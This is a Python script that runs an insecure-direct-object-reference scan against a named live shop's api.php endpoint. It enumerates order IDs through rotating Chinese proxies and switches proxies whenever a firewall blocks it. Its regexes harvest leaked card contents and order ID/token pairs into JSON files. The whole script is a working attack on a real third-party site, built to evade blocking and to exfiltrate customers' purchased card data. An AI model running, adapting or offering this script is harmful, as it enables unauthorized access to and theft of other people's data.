#!/usr/bin/env python3
"""xinhe001 api.php IDOR scan via Qingguo domestic CN proxy (C413ED6D 中转池)."""
from __future__ import annotations

import json
import os
import re
import sys
import time
from datetime import datetime
from pathlib import Path

import requests

from qg_cn_proxy import DEFAULT_KEY, DEFAULT_PWD, fetch_proxy, make_session, rotate_until_working

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = Path(
    sys.argv[1]
    if len(sys.argv) > 1
    else f"/workspace/results_xinhe001/cn_api_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
)
ID_END = int(sys.argv[2]) if len(sys.argv) > 2 else 0
API_N = int(sys.argv[3]) if len(sys.argv) > 3 else 200
AREA = os.environ.get("QG_CN_AREA", "")
DELAY = float(os.environ.get("CN_API_DELAY", "3.0"))

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def log(msg: str) -> None:
    print(msg, flush=True)
    OUT.mkdir(parents=True, exist_ok=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def warm(s: requests.Session) -> tuple[bool, int]:
    try:
        r = s.get(BASE, timeout=30)
        if len(r.text) < 5000:
            return False, 0
        gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
        orders = int(json.loads(gc.text).get("orders", 0))
        return True, orders
    except Exception as e:
        log(f"warm err: {e}")
        return False, 0


def leak(body: str) -> bool:
    return bool(
        SHOW.search(body)
        or CARD.search(body)
        or ("kminfo" in body and '"code":0' in body)
        or ("----" in body and "COM" in body)
    )


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    area = AREA or None
    px, rot_log = rotate_until_working(
        key=os.environ.get("QG_CN_KEY", DEFAULT_KEY),
        pwd=os.environ.get("QG_CN_PWD", DEFAULT_PWD),
        area=area,
        attempts=int(os.environ.get("QG_CN_ROTATE_ATTEMPTS", "15")),
    )
    (OUT / "rotate_log.json").write_text(
        json.dumps(rot_log, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    if not px:
        if rot_log.get("whitelist_block"):
            log(
                "BLOCKED: 跳板 IP 未加入青果白名单。"
                "请在控制台为 C413ED6D 添加本机出口 IP，或在国内跳板机上运行本脚本。"
            )
        else:
            log("FAIL: cannot obtain working CN proxy")
        return

    log(f"CN proxy {px.area} exit={px.proxy_ip} relay={px.server}")

    s = make_session(px.proxy_url)
    ok, orders = warm(s)
    if not ok:
        log("FAIL: homepage/getcount via CN proxy")
        return

    if not ID_END:
        id_end = orders - API_N
    else:
        id_end = ID_END
    log(f"orders={orders} scan {orders}..{id_end}")

    hits: list[dict] = []
    pairs: dict[str, str] = {}
    waf_streak = 0
    acts = ["search", "order", "query", "kmmail"]

    for oid in range(orders, id_end, -1):
        for act in acts:
            try:
                r = s.get(BASE + f"api.php?act={act}&id={oid}", timeout=28)
                waf_streak = 0
                body = r.text.strip()
                if not body or "No Act" in body or '"code":-5' in body:
                    continue
                if leak(body) or ('"code":0' in body and len(body) > 40):
                    hit = {"act": act, "id": oid, "body": body[:1000]}
                    hits.append(hit)
                    for m in SHOW.finditer(body):
                        pairs[m.group(1)] = m.group(2)
                    log(f"HIT {act} id={oid} {body[:100]}")
            except Exception as e:
                err = str(e).lower()
                if any(x in err for x in ("reset", "disconnect", "proxy", "eof", "timeout")):
                    waf_streak += 1
                    log(f"err id={oid} waf_streak={waf_streak}: {str(e)[:80]}")
                    if waf_streak >= 3:
                        npx = fetch_proxy(area=area)
                        if npx:
                            px = npx
                            s = make_session(px.proxy_url)
                            warm(s)
                            waf_streak = 0
                            log(f"rotated -> {px.area} {px.proxy_ip}")
                    time.sleep(8)
                else:
                    log(f"err id={oid}: {e}")
            time.sleep(DELAY)

        if oid % 20 == 0:
            (OUT / "hits.json").write_text(
                json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8"
            )
            (OUT / "pairs.json").write_text(
                json.dumps(pairs, ensure_ascii=False, indent=2), encoding="utf-8"
            )
            log(f"progress id={oid} hits={len(hits)} pairs={len(pairs)}")

    report = {
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "proxy": px.as_dict(),
        "orders": orders,
        "id_range": [orders, id_end],
        "hits": len(hits),
        "pairs": len(pairs),
        "CARD_LEAK": bool(hits or pairs),
    }
    (OUT / "hits.json").write_text(json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT / "pairs.json").write_text(json.dumps(pairs, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"DONE hits={len(hits)} pairs={len(pairs)}")


if __name__ == "__main__":
    main()
